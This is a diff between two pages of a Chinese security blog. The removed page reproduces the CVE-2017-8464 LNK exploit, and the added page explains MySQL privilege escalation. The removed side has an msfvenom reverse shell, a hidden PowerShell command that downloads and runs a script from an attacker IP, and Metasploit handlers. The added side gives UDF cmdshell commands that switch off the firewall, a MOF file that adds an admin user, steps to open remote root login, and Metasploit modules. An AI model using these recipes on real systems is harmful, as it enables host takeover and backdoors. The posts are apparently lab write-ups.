@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="CVE-2017-8464(快捷方式远程代码执行)漏洞复现, Sheng &#39;s blog">
+    <meta name="keywords" content="MySQL提权, Sheng &#39;s blog">
     <meta name="description" content="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>CVE-2017-8464(快捷方式远程代码执行)漏洞复现 | Sheng &#39;s blog</title>
+    <title>MySQL提权 | Sheng &#39;s blog</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -29,7 +29,7 @@
 
     <script src="/libs/jquery/jquery.min.js"></script>
 
-<meta name="generator" content="Hexo 5.4.0"><link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+<meta name="generator" content="Hexo 4.2.0"><link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
 
 
 
@@ -310,12 +310,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/15.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/9.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">CVE-2017-8464(快捷方式远程代码执行)漏洞复现</h1>
+                    <h1 class="description center-align post-title">MySQL提权</h1>
                 </div>
             </div>
         </div>
@@ -431,12 +431,12 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/%E5%A4%8D%E7%8E%B0/">
-                                <span class="chip bg-color">复现</span>
+                            <a href="/tags/MySQL/">
+                                <span class="chip bg-color">MySQL</span>
                             </a>
                         
-                            <a href="/tags/LNK/">
-                                <span class="chip bg-color">LNK</span>
+                            <a href="/tags/%E6%8F%90%E6%9D%83/">
+                                <span class="chip bg-color">提权</span>
                             </a>
                         
                     </div>
@@ -451,14 +451,24 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2021-05-03
+                    2021-04-11
                 </div>
                 
 
                 
 
                 
+                <div class="info-break-policy">
+                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
+                    1.3k
+                </div>
+                
 
+                
+                <div class="info-break-policy">
+                    <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
+                    5 分
+                </div>
                 
 
                 
@@ -472,87 +482,175 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="CVE-2017-8464-快捷方式远程代码执行"><a href="#CVE-2017-8464-快捷方式远程代码执行" class="headerlink" title="CVE-2017-8464(快捷方式远程代码执行)"></a>CVE-2017-8464(快捷方式远程代码执行)</h1><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>微软<strong>2017年06月13日</strong>公布两个可被利用的远程代码执行漏洞其中**(CVE-2017-8464)LNK文件远程代码执行漏洞**曾被用在Stuxnet（震网病毒）软件中。Nessus在漏洞公布24小时内就已具备漏洞检查发现能力，Tenable用户只需要自动更新到最新的漏洞插件库，就能具备该漏洞发现能力。RCE漏洞存在于Windows处理LNK文件的环节。攻击者利用漏洞可以获得与本地用户相同的用户权限。被使用此漏洞攻击时，用户权限较少的账户相较管理员权限的用户受到的影响更小。</p>
-<p><strong>漏洞名称：</strong>LNK文件远程代码执行漏洞<br><strong>漏洞编号：</strong>CVE-2017-8464<br><strong>漏洞等级：</strong>严重<br><strong>漏洞概要：</strong>如果用户打开攻击者精心构造的恶意LNK文件，则会造成远程代码执行。成功利用此漏洞的攻击者可以获得与本地用户相同的用户权限。 攻击者可以通过可移动驱动器(U盘)或远程共享等方式将包含恶意LNK文件和与之相关的恶意二进制文件传播给用户。当用户通过Windows资源管理器或任何能够解析LNK文件的程序打开恶意的LNK文件时，与之关联的恶意二进制代码将在目标系统上执行。 </p>
-<p><strong>漏洞利用条件和方式：</strong>远程利用<br><strong>漏洞影响范围:</strong> </p>
-<ul>
-<li>Microsoft Windows 10 Version 1607 for 32-bit Systems</li>
-<li>Microsoft Windows 10 Version 1607 for x64-based Systems</li>
-<li>Microsoft Windows 10 for 32-bit Systems</li>
-<li>Microsoft Windows 10 for x64-based Systems</li>
-<li>Microsoft Windows 10 version 1511 for 32-bit Systems</li>
-<li>Microsoft Windows 10 version 1511 for x64-based Systems</li>
-<li>Microsoft Windows 10 version 1703 for 32-bit Systems</li>
-<li>Microsoft Windows 10 version 1703 for x64-based Systems</li>
-<li>Microsoft Windows 7 for 32-bit Systems SP1</li>
-<li>Microsoft Windows 7 for x64-based Systems SP1</li>
-<li>Microsoft Windows 8.1 for 32-bit Systems</li>
-<li>Microsoft Windows 8.1 for x64-based Systems</li>
-<li>Microsoft Windows RT 8.1</li>
-</ul>
-<blockquote>
-<p><strong>服务器系统</strong></p>
+                <h1 id="MySQL提权"><a href="#MySQL提权" class="headerlink" title="MySQL提权"></a>MySQL提权</h1><blockquote>
+<p>流程：服务探针——信息收集——提权利用——获取权限</p>
 </blockquote>
+<p><strong>提权前提：</strong>获取数据库最高管理员的账户密码</p>
 <ul>
-<li>Microsoft Windows Server 2008 R2 for Itanium-based Systems SP1</li>
-<li>Microsoft Windows Server 2008 R2 for x64-based Systems SP1</li>
-<li>Microsoft Windows Server 2008 for 32-bit Systems SP2</li>
-<li>Microsoft Windows Server 2008 for Itanium-based Systems SP2</li>
-<li>Microsoft Windows Server 2008 for x64-based Systems SP2</li>
-<li>Microsoft Windows Server 2012</li>
-<li>Microsoft Windows Server 2012 R2</li>
-<li>Microsoft Windows Server 2016</li>
+<li>读取网站数据库配置文件（了解其命名规则及查找技巧）</li>
 </ul>
-<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>Kali： 172.16.9.195</p>
-<p>靶机：172.16.9.178</p>
-<p><strong>1、Kali生成一个ps1的反弹shell木马</strong></p>
-<pre class=" language-shell"><code class="language-shell">msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=172.16.9.195 lport=4448 -f  psh-reflection>/root/search.ps1
+<pre><code>sql、data、inc、config、conn、database、common、include
 </code></pre>
-<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210503105623925.png" alt="image-20210503105623925"></p>
-<p><strong>2、Kali开启http服务，将<code>search.ps1</code>文件移动至web根目录下</strong></p>
-<pre class=" language-shell"><code class="language-shell">mv  search.ps1  /var/www/html
-systemctl start apache2
+<ul>
+<li>读取数据库存储或备份文件（了解数据库存储格式及对应内容）</li>
+</ul>
+<pre><code>@@basedir/data/数据库名/表名.MYD    (表内容)
 </code></pre>
-<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210503110302464.png" alt="image-20210503110302464"></p>
-<p><strong>3、靶机访问Kali web服务器下的<code>search.ps1</code>文件，发现可以直接访问</strong></p>
-<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210503110222627.png" alt="image-20210503110222627"></p>
-<p><strong>4、在靶机上创建一个PowerShell远程快捷方式</strong></p>
-<pre class=" language-powershell"><code class="language-powershell">powershell <span class="token operator">-</span>windowstyle hidden <span class="token operator">-</span>exec bypass <span class="token operator">-</span>c <span class="token string">"IEX (New-Object Net.WebClient).DownloadString('http://172.16.9.195/search.ps1');test.ps1"</span>
+<ul>
+<li>暴力破解（了解数据库是否支持外联及如何开启外联）</li>
+</ul>
+<h2 id="UDF提权"><a href="#UDF提权" class="headerlink" title="UDF提权"></a>UDF提权</h2><p>利用root权限，创建带有调用cmd函数的<code>udf.dll</code>(动态链接库)。当我们把<code>udf.dll</code>导出指定文件夹引入MySQL时，其中的调用函数拿出来当作MySQL的函数使用。这样我们自定义的函数才被当作本机函数执行。在使用<code>CREAT FUNCITON</code>调用dll中的函数后，MySQL账号转化为system权限，从而来提权。</p>
+<blockquote>
+<p>MySQL &lt; 5.1    <code>udf.dll</code>文件在Windows2003下放置于<code>c:\windows\system32</code>，在windows2000下放置于<code>c:\winnt\system32</code>。</p>
+<p>MySQL =&gt; 5.1    <code>udf.dll</code>文件必须放置于<code>MYSQL安装目录下的lib\plugin</code>文件夹下。</p>
+</blockquote>
+<p><strong>查看数据库服务版本信息</strong></p>
+<pre class=" language-mysql"><code class="language-mysql">select @@version;
+select version();
 </code></pre>
-<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210503111554493.png" alt="image-20210503111554493"></p>
-<p><strong>5、Kali进行监听，靶机执行后门文件</strong></p>
-<pre class=" language-shell"><code class="language-shell">use exploit/multi/handler
-set payload windows/x64/meterpreter/reverse_tcp
-show options
-set LHOST 172.16.9.195
-set lport 4448
+<p><strong>查看数据库安装目录</strong></p>
+<pre class=" language-mysql"><code class="language-mysql">select @@basedir;
+select basedir();
+</code></pre>
+<p><strong>查看MySQL安装路径</strong></p>
+<pre class=" language-mysql"><code class="language-mysql">show variables like '%plugins%'; 
+</code></pre>
+<p><strong>利用<code>NTFS ADS</code>创建<code>lib</code>目录</strong></p>
+<pre class=" language-mysql"><code class="language-mysql">select 'x' into dumpfile '安装目录\\lib::$INDEX_ALLOCATION';
+</code></pre>
+<p><strong>利用<code>NTFS ADS</code>创建<code>plugin</code>目录</strong></p>
+<pre class=" language-mysql"><code class="language-mysql">select 'x' into dumpfile '安装目录\\lib\\plugin::$INDEX_ALLOCATION';
+</code></pre>
+<p><strong>UDF提权文件所在位置</strong></p>
+<p>msf的UDF文件原C++函数没有写异常处理，那么MySQL加载的时候会使MySQL出错导致断开连接。</p>
+<blockquote>
+<p>metasploit下的动态链接库</p>
+</blockquote>
+<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210410101535951.png" alt="image-20210410101535951"></p>
+<blockquote>
+<p>sqlmap下的动态链接库</p>
+</blockquote>
+<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210410101703903.png" alt="image-20210410101703903"></p>
+<blockquote>
+<p>sqlmap下的4个UDF文件是经过编码的，如果直接丢在MySQL的<code>plugin</code>目录下是无法加载的，需要用<code>sqlmap/extra/cloak/cloak.py</code>进行解码</p>
+</blockquote>
+<pre class=" language-shell"><code class="language-shell">python .\cloak.py -d -i ..\..\data\udf\mysql\windows\64\lib_mysqludf_sys.dll_ -o lib_mysqludf_sys.dll
+</code></pre>
+<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210410101854163.png" alt="image-20210410101854163"></p>
+<p><strong>导出<code>dll</code>到指定目录</strong></p>
+<p>可以使用msf中<code>mysql_udf_payload</code>模块</p>
+<blockquote>
+<p>条件：</p>
+<p><code>secure_auth=YES</code>    (运行导出文件)</p>
+<p><code>secure_file_prive=空</code>    (可以导出任意文件到任意位置)</p>
+</blockquote>
+<p><strong>查看是否允许文件导出导入</strong></p>
+<pre class=" language-mysql"><code class="language-mysql">show variables like "%secure%";
+</code></pre>
+<p><strong>导出<code>dll</code></strong></p>
+<pre class=" language-mysql"><code class="language-mysql">select 'lib_mysqludf_sys.dll' into outfile '安装目录/lib/pulgin/udf.dll';
+</code></pre>
+<p><strong>创建<code>cmdshell</code> 函数</strong> (该函数叫什么名字在后续中则使用该函数进行查询)</p>
+<pre class=" language-mysql"><code class="language-mysql">create function cmdshell returns string soname 'udf.dll';
+
+# [AGGREATE]是聚集函数的表示，系统定义的聚集函数比如有COUNT()、AVE()、MN()、MAX()、SUM()
+# SONAME 'file'表示这个函数从哪个文件里面引入，而这个文件一般是动态链接库，windows下是dll，linux是so，并且这个文件要在mysql的plugin目录下
+</code></pre>
+<p><strong>执行命令</strong></p>
+<pre class=" language-mysql"><code class="language-mysql">select cmdshell('whoami');
+# 关闭windows防火墙和筛选
+select cmdshell('net stop policyagent');     
+select cmdshell('net stop sharedaccess');
+select cmdshell('netsh advfirewall set allprofiles state off');
+</code></pre>
+<p><strong><code>udf.dll</code>下常见函数</strong></p>
+<pre class=" language-shell"><code class="language-shell">cmdshell     //执行cmd;
+downloader     //下载者,到网上下载指定文件并保存到指定目录;
+open3389     //通用开3389终端服务,可指定端口(不改端口无需重启);
+backshell     //反弹Shell;
+ProcessView //枚举系统进程;
+KillProcess //终止指定进程;
+regread     //读注册表;
+regwrite     //写注册表;
+shut         //关机,注销,重启;
+about         //说明与帮助函数;
+</code></pre>
+<h2 id="MOF提权"><a href="#MOF提权" class="headerlink" title="MOF提权"></a>MOF提权</h2><p>MOF是windows系统的一个文件（在<code>c:/windows/system32/wbem/mof/nullevt.mof</code>）叫做<code>托管对象格式</code>其作用是每隔五秒就会去监控进程创建和死亡。</p>
+<p>其实就是用了MySQL的root权限了以后，然后使用root权限去执行我们上传的MOF。隔了一定时间以后这个MOF就会被执行，这个MOF当中有一段是vbs脚本，这个vbs大多数的是cmd的添加管理员用户的命令。</p>
+<p><strong>MOF提权过程:</strong></p>
+<ol>
+<li>将MOF上传至任意可读可写目录下</li>
+<li>更改MOF文件代码</li>
+</ol>
+<pre class=" language-shell"><code class="language-shell">#pragma namespace("\\\\.\\root\\subscription") 
+
+instance of __EventFilter as $EventFilter 
+{ 
+    EventNamespace = "Root\\Cimv2"; 
+    Name  = "filtP2"; 
+    Query = "Select * From __InstanceModificationEvent " 
+            "Where TargetInstance Isa \"Win32_LocalTime\" " 
+            "And TargetInstance.Second = 5"; 
+    QueryLanguage = "WQL"; 
+}; 
+
+instance of ActiveScriptEventConsumer as $Consumer 
+{ 
+    Name = "consPCSV2"; 
+    ScriptingEngine = "JScript"; 
+    ScriptText = 
+    "var WSH = new ActiveXObject(\"WScript.Shell\")\nWSH.run(\"net.exe user admin admin /add\")"; 
+}; 
+
+instance of __FilterToConsumerBinding 
+{ 
+    Consumer   = $Consumer; 
+    Filter = $EventFilter; 
+};
+</code></pre>
+<ol start="3">
+<li>使用SQL语句将系统当中默认的<code>nullevt.mof</code>给替换掉</li>
+</ol>
+<pre class=" language-mysql"><code class="language-mysql">select load_file('D:\wamp\xishaonian.mof') into dumpfile 'c:/windows/system32/wbem/mof/nullevt.mof';
+</code></pre>
+<h3 id="MSF进行MOF提权"><a href="#MSF进行MOF提权" class="headerlink" title="MSF进行MOF提权"></a>MSF进行MOF提权</h3><blockquote>
+<p>Msf下的<code>exploit/windows/mysql/mysql_mof</code>模块提供了直接MOF提权，不过该漏洞成功跟操作系统权限和MySQL数据库版本有关，执行成功后会直接反弹shell到meterpreter。</p>
+</blockquote>
+<pre class=" language-shell"><code class="language-shell">use exploit/windows/mysql/mysql_mof
+set rhost IP //设置需要提权的远程主机IP地址
+set rport 3306 //设置mysql的远程端口
+set password root //设置mysql数据库root密码
+set username root //设置mysql用户名
+show options //查看设置
 exploit
 </code></pre>
-<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210503111514093.png" alt="image-20210503111514093"></p>
-<h2 id="msf模块实现"><a href="#msf模块实现" class="headerlink" title="msf模块实现"></a>msf模块实现</h2><pre class=" language-shell"><code class="language-shell">msfconsole
-search cve-2017-8464
-use exploit/windows/fileformat/cve_2017_8464_lnk_rce
-set PAYLOAD windows/meterpreter/reverse_tcp
-set LHOST 172.16.9.195
+<blockquote>
+<p>MySQL允许远程root登入</p>
+</blockquote>
+<pre class=" language-mysql"><code class="language-mysql">一:
+use mysql;
+update user set host = '%' where user = 'root';
+FLUSH PRIVILEGES ;
+二:
+GRANT ALL PRIVILEGES ON . TO 'root'@'%' IDENTIFIED BY 'youpassword' WITH GRANT OPTION;
+FLUSH PRIVILEGES;
+</code></pre>
+<h2 id="启动项提权"><a href="#启动项提权" class="headerlink" title="启动项提权"></a>启动项提权</h2><blockquote>
+<p>导出自定义可执行文件到启动目录配合重启执行</p>
+<p>将创建好的后门或执行文件进行服务器启动项写入,配合重启执行</p>
+</blockquote>
+<p><strong>MSF进行启动项提权</strong></p>
+<pre class=" language-shell"><code class="language-shell">use exploit/windows/mysql/mysql_start_up
+set rhost IP //设置需要提权的远程主机IP地址
+set rport 3306 //设置mysql的远程端口
+set password root //设置mysql数据库root密码
+set username root //设置mysql用户名
+show options //查看设置
 exploit
 </code></pre>
-<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210503111733852.png" alt="image-20210503111733852"></p>
-<blockquote>
-<p>在/root/.msf4/local目录下生成我们的利用文件</p>
-</blockquote>
-<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210503112749608.png" alt="image-20210503112749608"></p>
-<p><strong>全部复制到移动磁盘里面(u盘拷贝)</strong></p>
-<p><img src="https://gitee.com/ms12020/picture/raw/master/images/15018882278391.gif!small" alt="th.gif"></p>
-<blockquote>
-<p>然后在msf中监听</p>
-</blockquote>
-<pre class=" language-shell"><code class="language-shell">search multi/handler
-use exploit/multi/handler
-set payload windows/meterpreter/reverse_tcp
-set LHOST 172.16.9.195
-run
-</code></pre>
-<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210503113015015.png" alt="image-20210503113015015"></p>
+<p><a href="https://xz.aliyun.com/t/2719" target="_blank" rel="noopener">Windows下三种MySQL提权剖析</a></p>
+<p><a href="https://www.cnblogs.com/yzloo/p/10390916.html" target="_blank" rel="noopener">MySQL数据库渗透及漏洞利用总结</a></p>
+<p><a href="https://www.cnblogs.com/xishaonian/p/6384535.html" target="_blank" rel="noopener">mof提权原理及其过程</a></p>
 
                 
             </div>
@@ -579,7 +677,7 @@ run
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://ms12020.github.io/2021/05/03/%E5%88%A9%E7%94%A8CVE-2017-8464%E6%BC%8F%E6%B4%9E%E5%AE%9E%E7%8E%B0LNK%E6%96%87%E4%BB%B6%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/">https://ms12020.github.io/2021/05/03/%E5%88%A9%E7%94%A8CVE-2017-8464%E6%BC%8F%E6%B4%9E%E5%AE%9E%E7%8E%B0LNK%E6%96%87%E4%BB%B6%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/</a>
+                    <a href="https://ms12020.github.io/2021/04/11/mysql-ti-quan/">https://ms12020.github.io/2021/04/11/mysql-ti-quan/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -617,12 +715,12 @@ run
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/%E5%A4%8D%E7%8E%B0/">
-                                    <span class="chip bg-color">复现</span>
+                                <a href="/tags/MySQL/">
+                                    <span class="chip bg-color">MySQL</span>
                                 </a>
                             
-                                <a href="/tags/LNK/">
-                                    <span class="chip bg-color">LNK</span>
+                                <a href="/tags/%E6%8F%90%E6%9D%83/">
+                                    <span class="chip bg-color">提权</span>
                                 </a>
                             
                         </div>
@@ -672,13 +770,13 @@ run
             <div class="article-badge left-badge text-color">
                 <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/2021/05/05/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%88%AA%E6%96%AD/">
+                <a href="/2021/04/25/qiang-wang-bei-2019-sui-bian-zhu/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/1.jpg" class="responsive-img" alt="文件包含漏洞-文件包含截断">
+                        <img src="/medias/featureimages/0.jpg" class="responsive-img" alt="2019强网杯 随便注">
                         
-                        <span class="card-title">文件包含漏洞-文件包含截断</span>
+                        <span class="card-title">2019强网杯 随便注</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -689,7 +787,7 @@ run
                     </div>
                     <div class="publish-info">
                         <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2021-05-05
+                            <i class="far fa-clock fa-fw icon-date"></i>2021-04-25
                         </span>
                         <span class="publish-author">
                             
@@ -702,12 +800,8 @@ run
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">
-                        <span class="chip bg-color">文件包含</span>
-                    </a>
-                    
-                    <a href="/tags/Web/">
-                        <span class="chip bg-color">Web</span>
+                    <a href="/tags/CTF/">
+                        <span class="chip bg-color">CTF</span>
                     </a>
                     
                 </div>
@@ -721,13 +815,13 @@ run
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2021/04/25/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8(%E4%B8%80)/">
+                <a href="/2021/04/10/cve-2020-0796-yong-heng-zhi-hei-lou-dong-fu-xian/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/15.jpg" class="responsive-img" alt="缓冲区溢出分析与利用(一)">
+                        <img src="/medias/featureimages/10.jpg" class="responsive-img" alt="CVE-2020-0796（永恒之黑)漏洞复现">
                         
-                        <span class="card-title">缓冲区溢出分析与利用(一)</span>
+                        <span class="card-title">CVE-2020-0796（永恒之黑)漏洞复现</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -738,7 +832,7 @@ run
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2021-04-25
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-04-10
                             </span>
                         <span class="publish-author">
                             
@@ -755,8 +849,12 @@ run
                         <span class="chip bg-color">复现</span>
                     </a>
                     
-                    <a href="/tags/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/">
-                        <span class="chip bg-color">缓冲区溢出</span>
+                    <a href="/tags/Windows-10/">
+                        <span class="chip bg-color">Windows 10</span>
+                    </a>
+                    
+                    <a href="/tags/SMB/">
+                        <span class="chip bg-color">SMB</span>
                     </a>
                     
                 </div>
@@ -958,6 +1056,9 @@ run
             |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
             <br>
             
+            &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
+                class="white-color">11.7k</span>&nbsp;字
+            
             
             
             
@@ -1130,6 +1231,9 @@ $(function () {
     <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
     <script src="/js/matery.js"></script>
 	<script src="/js/FunnyTitle.js"></script>
+	<canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;" ></canvas>
+	<script type="text/javascript" src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"></script>
+	<script type="text/javascript" src="/js/fireworks.js"></script>
 
     <!-- Baidu Analytics -->
 
